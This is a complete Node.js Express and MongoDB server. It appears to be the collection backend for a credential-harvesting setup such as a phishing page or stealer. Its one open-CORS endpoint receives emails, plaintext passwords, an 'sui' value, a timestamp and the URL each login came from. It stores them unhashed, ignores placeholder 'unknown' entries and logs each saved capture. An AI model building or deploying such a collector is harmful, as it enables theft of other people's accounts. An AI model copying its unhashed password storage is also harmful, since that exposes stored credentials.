const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

mongoose
  .connect(process.env.MONGODB_URI, { // mongodb_uri you will need to set a env variable with your monngodb uri
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("Connected! :D"))
  .catch((err) => console.error("Eror D: ", err));

const loginSchema = new mongoose.Schema({
  email: String,
  password: String, // password in pure text (no hash)
  sui: String,
  timestamp: String,
  url: String,
});

const Login = mongoose.model("Login", loginSchema);

// endpoint to save login
app.post("/api/login", async (req, res) => {
  try {
    const { email, password, sui, timestamp, url } = req.body;

    // skip invalid logins
    if (email === "unknown" || password === "unknown") {
      console.log("Ignoring invalid entry:", {
        email,
        timestamp,
      });
      return res.status(400).json({ error: "invalid credentials" });
    }

    // storage of login
    const login = new Login({
      email,
      password, // no hash
      sui,
      timestamp,
      url,
    });

    await login.save();
    console.log("Login saved:", { email, sui, timestamp });
    res.status(200).json({ message: "login saved successfully yay" });
  } catch (error) {
    console.error("Error saving login:", error);
    res.status(500).json({ error: "Error saving login" });
  }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
